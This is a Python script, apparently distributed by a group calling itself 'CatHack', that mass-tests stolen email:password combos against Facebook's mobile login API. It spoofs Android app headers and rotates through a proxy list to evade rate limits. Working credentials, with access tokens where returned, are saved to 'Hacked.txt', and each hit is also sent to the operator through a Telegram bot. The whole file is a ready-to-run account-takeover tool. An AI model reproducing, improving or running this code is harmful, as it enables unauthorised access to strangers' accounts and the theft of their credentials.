from random import choice
import json , os  , requests  , time , sys ,gzip
from datetime import datetime 
from threading import Thread , Lock
from colorama import Fore , Style 
from typing import List 
from urllib.parse import quote 
from queue import Queue 
from urllib.parse import urlencode
Purple = "\033[1;35m"

def LOGO():
    os.system('cls' if os.name == 'nt' else 'clear')
    return fr"""{Fore.CYAN}
             *     ,MMM8&&&.            *
                  MMMM88&&&&&    .
                 MMMM88&&&&&&&
     *           MMM88&&&&&&&&
                 MMM88&&&&&&&&
                 'MMM88&&&&&&'
                   'MMM8&&&'      *
          |\___/|
          )     (             .              '
         =\     /=
           )===(       *                           Verify subscription ..
          /     \
          |     |       CAT HACK
         /       \   IG: @_cathack
         \       /
  _/\_/\_/\__  _/_/\_/\_/\_/\_/\_/\_/\_/\_/\_
  |  |  |  |( (  |  |  |  |  |  |  |  |  |  |
  |  |  |  | ) ) |  |  |  |  |  |  |  |  |  |
  |  |  |  |(_(  |  |  |  |  |  |  |  |  |  |
  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
  JQ |  |  |  |  |  |  |  |  |  |  |  |  |  |    {Style.RESET_ALL}                                                                                                                                  
"""
def LOGO2():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(fr""" {Fore.CYAN}                                                       
                                                                                
 ████████                                ██████▒                       ██       
 ████████                                ███████▓                      ██           By CatHack IG: @_cathack & @221298
 ██                                      ██   ▒██                      ██         
 ██         ▒████▓     ▓████▒   ░████▒   ██    ██   ░████░    ░████░   ██  ▓██▒ 
 ██         ██████▓   ███████  ░██████▒  ██   ▒██  ░██████░  ░██████░  ██ ▓██▒       
 ███████    █▒  ▒██  ▓██▒  ▒█  ██▒  ▒██  ███████░  ███  ███  ███  ███  ██▒██▒  
 ███████     ▒█████  ██░       ████████  ███████░  ██░  ░██  ██░  ░██  ████▓   
 ██        ░███████  ██        ████████  ██   ▒██  ██    ██  ██    ██  █████  
 ██        ██▓░  ██  ██░       ██        ██    ██  ██░  ░██  ██░  ░██  ██░███  
 ██        ██▒  ███  ▓██▒  ░█  ███░  ▒█  ██   ▒██  ███  ███  ███  ███  ██  ██▒  
 ██        ████████   ███████  ░███████  ████████  ░██████░  ░██████░  ██  ▒██  
 ██         ▓███░██    ▓████▒   ░█████▒  ██████▓    ░████░    ░████░   ██   ███ 
{Style.RESET_ALL}""")


##==================================== Check File :  #====================================
class Check_File:
    @staticmethod
    def read_file_lines(file_path: str) -> List[str]:
        """Read file lines safely."""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                return file.readlines()
        except FileNotFoundError:
            print('[+] Error, file not found. Try Again.')
        except UnicodeDecodeError as e:
            print(f'[+] Error decoding file: {e}')
        except Exception as e:
            print(f'[+] Unexpected error: {e}')
        return []

    @staticmethod
    def get_user_input(prompt: str, error_message: str) -> str:
        """Get user input with validation."""
        while True:
            try:
                value = input(prompt).strip()
                if value:
                    return value
                print(error_message)
            except KeyboardInterrupt:
                print("\n[+] Operation cancelled by user.")
                sys.exit(0)
            except Exception as e:
                print(f"[+] Error: {e}")
class TwitterLogin:
    def __init__(self):
        self.RUN = True
        self.PRINT = Lock()
        self.user , self.password= "jokr" , 'paassword1'
        self.TOKEN = None
        self.ID = None
        self.OLD_LIST = []
        self.CM ,self.CM2 = 10,0
        self.q = Queue()
        self.rate_limits = 3
        self.stats = {
            'success': 0,
            'secure': 0,
            'banned': 0,
            'bad_password': 0,
            'proxy_errors': 0,
            'errors': 0,
            'rate_limit': 0}
        self.Check_Mode()
        self.proxy_update_interval = 1800
        
    def update_proxy(self):
        PRX = str(choice(self.proxy))
        return {'http': f'{PRX}','https': f'{PRX}'}
    
    def Check_Mode(self):
        while True:
            try:
                LOGO2()
                self.t = Check_File.get_user_input('\n[+] Enter Combo File: ', '[+] Error, file not found. Try Again.')
                with open(self.t, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        self.q.put(line.strip())
                break
            except Exception as jok:
                print(jok)
                continue
        self.thr()
    
    def Save_File(self,filename,data):
        self.stats['rate_limit'] = 0
        try:
            with open(f'cathack_Facebook_BruteForce/{filename}', 'a' , encoding='utf-8' , errors='ignore') as wr:
                wr.write(f"{data}\n")
        except Exception as e:
            try:
                with open(f'cathack_Facebook_BruteForce/{filename}', 'a') as wr:
                    wr.write(f"{data}\n")
            except Exception as e:
                pass
        
    def login(self):
        while self.RUN:
            proxy = self.update_proxy()
            try:
                email , password = self.user , self.password
                headers = {
                    "Host": "b-graph.facebook.com",
                    "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-connection-type": "WIFI",
                    "content-encoding": "gzip",
                    "x-fb-net-hni": "28301",
                    "x-fb-sim-hni": "28301",
                    "zero-rated": "0",
                    "x-fb-friendly-name": "authenticate",
                    "x-fb-connection-quality": "EXCELLENT",
                    "authorization": "OAuth null",
                    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/en_US;FBBV/480086274;FBCR/ArmenTel-Beeline;FBMF/google;FBBD/google;FBDV/G011A;FBSV/9;FBCA/x86:armeabi-v7a;FBDM/{density=1.875,width=1600,height=900};FB_FW/1;FBRV/0;]",
                    "x-fb-device-group": "2656",
                    "x-tigon-is-retry": "False",
                    "priority": "u=3,i",
                    "accept-encoding": "gzip, deflate",
                    "x-fb-http-engine": "Liger",
                    "x-fb-client-ip": "True",
                    "x-fb-server-cluster": "True"}
                data = {
                    "adid": "3526711c-d308-4d77-9843-5e7787a3f640",
                    "format": "json",
                    "device_id": "c4837047-8a1f-4a73-b7c0-e899f1906110",
                    "email": email,
                    "password": f"#PWD_FB4A:0:{str(time.time())}:{password}",
                    "generate_analytics_claim": "1",
                    "community_id": "",
                    "linked_guest_account_userid": "",
                    "cpl": "true",
                    "try_num": "2",
                    "family_device_id": "013dae4a-4de5-4731-8b14-be0892e2ffd5",
                    "secure_family_device_id": "e81bdca2-0ef1-4cb7-9cd0-a3cdaec6b1d6",
                    "sim_serials": '["09620042145614715284"]',
                    "credentials_type": "password",
                    "openid_flow": "android_login",
                    "openid_provider": "google",
                    "openid_tokens": "[]",
                    "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                    "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                    "enroll_misauth": "false",
                    "generate_session_cookies": "1",
                    "error_detail_type": "button_with_disabled",
                    "source": "login",
                    "generate_machine_id": "1",
                    "jazoest": "22234",
                    "meta_inf_fbmeta": "V2_UNTAGGED",
                    "advertiser_id": "3526711c-d308-4d77-9843-5e7787a3f640",
                    "encrypted_msisdn": "",
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "AM",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                    "sig": "ca6978db2e4cfe11869c097f367ee43b",
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"}

                response = requests.post(
                    "https://b-graph.facebook.com/auth/login",
                    headers=headers,
                    data=gzip.compress(urlencode(data).encode('utf-8')),
                    proxies=proxy,
                    timeout=10)
                if ('access_token' in response.text):
                    with self.PRINT:
                        if f'{email}:{password}' in self.OLD_LIST:pass
                        else:
                            self.OLD_LIST.append(f'{email}:{password}')
                            try:
                                access_token = response.json()['access_token']
                                self.stats['success'] += 1
                                self.Save_File('Hacked.txt', f'{email}:{password} | {access_token}')
                                self.send_TELEGRAM(email, password, 'Hacked')
                            except Exception as e:
                                self.stats['secure'] += 1
                                self.Save_File('Secure.txt', f'{email}:{password}')
                                self.send_TELEGRAM(email, password, 'Secure')
                        self.update_user_password()
                elif ('"error_user_title":"Account Temporarily Unavailable"' in response.text):
                    with self.PRINT:
                        try:
                            auth_token = response.json()['error']['error_data']['auth_token']
                            self.stats['secure'] += 1
                            self.Save_File('Secure.txt', f'{email}:{password}')
                            self.send_TELEGRAM(email, password, 'Secure')
                        except Exception as e:
                            if self.stats['rate_limit'] >= self.rate_limits:
                                self.stats['rate_limit'] = 0
                                self.stats['bad_password'] += 1
                                self.update_user_password()
                            else:
                                self.stats['rate_limit'] += 1
                elif ('"message":"User must verify their account on www.facebook.com"' in response.text):
                    with self.PRINT:
                        try:
                            auth_token = response.json()['error']['error_data']['auth_token']
                            self.stats['secure'] += 1
                            self.Save_File('Secure.txt', f'{email}:{password}')
                            self.send_TELEGRAM(email, password, 'Secure')
                        except Exception as e:
                            if self.stats['rate_limit'] >= self.rate_limits:
                                self.stats['rate_limit'] = 0
                                self.stats['bad_password'] += 1
                                self.update_user_password()
                            else:
                                self.stats['rate_limit'] += 1
                elif ('"message":"Login approvals are on. Expect an SMS shortly with a code to use for log in"' in response.text):
                    with self.PRINT:
                        try:
                            auth_token = response.json()['error']['error_data']['auth_token']
                            self.stats['secure'] += 1
                            self.Save_File('Secure.txt', f'{email}:{password}')
                            self.send_TELEGRAM(email, password, 'Secure')
                        except Exception as e:
                            if self.stats['rate_limit'] >= self.rate_limits:
                                self.stats['rate_limit'] = 0
                                self.stats['bad_password'] += 1
                                self.update_user_password()
                            else:
                                self.stats['rate_limit'] += 1
                elif ('"message":"Invalid username or password"' in response.text):
                    with self.PRINT:
                        if self.stats['rate_limit'] >= self.rate_limits:
                            self.stats['rate_limit'] = 0
                            self.stats['bad_password'] += 1
                            self.update_user_password()
                        else:
                            self.stats['rate_limit'] += 1
                elif ('"message":"Invalid username or email address"' in response.text):
                    with self.PRINT:
                        if self.stats['rate_limit'] >= self.rate_limits:
                            self.stats['rate_limit'] = 0
                            self.stats['bad_password'] += 1
                            self.update_user_password()
                        else:
                            self.stats['rate_limit'] += 1
                elif ('The parameter email is required' in response.text):
                    with self.PRINT:
                        if self.stats['rate_limit'] >= self.rate_limits:
                            self.stats['rate_limit'] = 0
                            self.stats['bad_password'] += 1
                            self.update_user_password()
                        else:
                            self.stats['rate_limit'] += 1
                elif ('"message":"The action attempted has been deemed abusive or is otherwise disallowed"' in response.text):
                    with self.PRINT:
                        if self.stats['rate_limit'] >= self.rate_limits:
                            self.stats['rate_limit'] = 0
                            self.stats['bad_password'] += 1
                            self.update_user_password()
                        else:
                            self.stats['rate_limit'] += 1
                elif ('"message":"Calls to this api have exceeded the rate limit."' in response.text):
                    self.stats['proxy_errors'] += 1
                else:
                    self.stats['errors'] += 1
                    self.Save_File('error.txt', f'{email}:{password} | {response.text}')
            except (requests.exceptions.ConnectionError , requests.exceptions.ReadTimeout , requests.exceptions.ChunkedEncodingError , requests.exceptions.InvalidURL , requests.exceptions.ProxyError , requests.exceptions.Timeout , requests.exceptions.HTTPError):
                self.stats['proxy_errors'] += 1
            except Exception as e:
                self.stats['errors'] += 1 
                self.Save_File('error.txt', f'{email}:{password} | {e}')
            with self.PRINT:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(fr""" {Fore.CYAN}                                                       
                                                                                
 ████████                                ██████▒                       ██       
 ████████                                ███████▓                      ██           By CatHack IG: @_cathack & @221298
 ██                                      ██   ▒██                      ██         
 ██         ▒████▓     ▓████▒   ░████▒   ██    ██   ░████░    ░████░   ██  ▓██▒    Account: {self.user}:{self.password}
 ██         ██████▓   ███████  ░██████▒  ██   ▒██  ░██████░  ░██████░  ██ ▓██▒       
 ███████    █▒  ▒██  ▓██▒  ▒█  ██▒  ▒██  ███████░  ███  ███  ███  ███  ██▒██▒      {Fore.GREEN}[+] Login Successfully: {self.stats["success"]} {Fore.CYAN}
 ███████     ▒█████  ██░       ████████  ███████░  ██░  ░██  ██░  ░██  ████▓       {Fore.YELLOW}[~] Login Secure: {self.stats["secure"]} {Fore.CYAN}
 ██        ░███████  ██        ████████  ██   ▒██  ██    ██  ██    ██  █████       {Fore.RED}[-] Login Failed: {self.stats["bad_password"]} {Fore.CYAN}
 ██        ██▓░  ██  ██░       ██        ██    ██  ██░  ░██  ██░  ░██  ██░███      {Fore.RED}[-] Proxy Errors: {self.stats["proxy_errors"]} {Fore.CYAN} 
 ██        ██▒  ███  ▓██▒  ░█  ███░  ▒█  ██   ▒██  ███  ███  ███  ███  ██  ██▒     {Fore.RED}[-] Errors: {self.stats["errors"]} {Fore.CYAN}
 ██        ████████   ███████  ░███████  ████████  ░██████░  ░██████░  ██  ▒██     {Purple}[-] Rate Limit: {self.stats["rate_limit"]} {Fore.CYAN}
 ██         ▓███░██    ▓████▒   ░█████▒  ██████▓    ░████░    ░████░   ██   ███ 
                                                                                               
 """)
    
    
    def send_TELEGRAM(self,username , password , Typs):
        TELEGRAM_MESSAGE = (
                f'Facebook Brute Force 🔥🔥\n'
                f"- User: {username}\n"
                f"- Password: {password}\n"
                f"- Type Account: {Typs}\n"
                f"- Fishing history: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
                f"☠️<a href='https://t.me/+Vn24yYDAItqSIYkH'>By CatHack</a> | <a href='https://t.me/vv3ck'>MrJoker</a>")
        data2 = {
            'chat_id': self.ID,
            'text': TELEGRAM_MESSAGE,
            'parse_mode': 'html'}
        try:requests.post(f'https://api.telegram.org/bot{self.TOKEN}/sendmessage', data=data2)
        except Exception as e:pass
    
    def update_user_password(self):
        combo = self.q.get()
        try:
            self.user, self.password = combo.split(':')
        except Exception as e:
            pass
                
                
    def Check_TelegramID(self):
        try:
            TELEGRAMS = open('TELEGRAM_BOT.json', 'r')
            TELEGRAMS = json.load(TELEGRAMS)
            self.ID = TELEGRAMS['ID']
            self.TOKEN = TELEGRAMS['TOKEN']
        except FileNotFoundError:
            self.ID = input('[+] Enter Telegram ID : ')
            self.TOKEN = input('[+] Enter Telegram Token : ')
            if self.ID and self.TOKEN:
                with open('TELEGRAM_BOT.json', 'w') as file:
                    file.write(f'{{"ID": "{self.ID}", "TOKEN": "{self.TOKEN}"}}')
            else:
                print('[+] Error, please enter the ID and Token.')
                return self.Check_TelegramID()
    def check_proxy(self):
        while True:
            LOGO2()
            px = input('[+] Enter proxy file: ')
            self.proxy = []
            if os.path.isfile(px):
                with open(px, 'r' , encoding='utf-8' , errors='ignore') as proxy_file:
                    for i in proxy_file.read().splitlines():
                        self.proxy.append(i)
                    break
            else:
                print(f'[+] Error, file not found. Try again. {px}')
        print(f'[+] Proxies Saved: {len(self.proxy)}')

    def set_threads(self):
        while True:
            try:
                self.thread_count = int(input('[+] Enter number of threads: '))
                if self.thread_count > 300:
                    self.thread_count = 250
                    print(f'[+] Thread count limited to {self.thread_count} for stability.')
                if self.thread_count > 0:
                    break
                print('[+] Error, thread count must be positive.')
            except ValueError:
                print('[+] Error, invalid number.')
    
    def thr(self): 
        self.check_proxy()
        self.set_threads()
        self.Check_TelegramID()
        self.update_user_password()
        os.makedirs('cathack_Facebook_BruteForce', exist_ok=True)
        thread = []
        for _ in range(self.thread_count):
            th=Thread(target=self.login )
            th.start()
            thread.append(th)
        for i in thread:
            i.join()
        
        if self.MOD != '2':
            self.q.join()

#==================================== Starts App : #====================================
def main():
    TwitterLogin()
main()
